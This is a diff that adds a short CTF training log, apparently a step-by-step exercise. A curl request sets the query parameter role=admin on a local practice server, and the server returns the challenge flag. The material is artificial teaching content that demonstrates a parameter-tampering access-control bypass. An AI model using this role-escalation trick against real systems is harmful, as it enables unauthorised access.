@@ -1,0 +1,9 @@
+# 第 2 步：只改参数值 role=admin
+PS C:\Users\mzj\Desktop\CTF\CTF-training-problem-first-full> curl.exe -s -i http://127.0.0.1:8765/gate?role=admin
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.12.10
+Date: Sat, 26 Sep 2026 03:15:35 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 26
+
+flag{http_query_is_input}
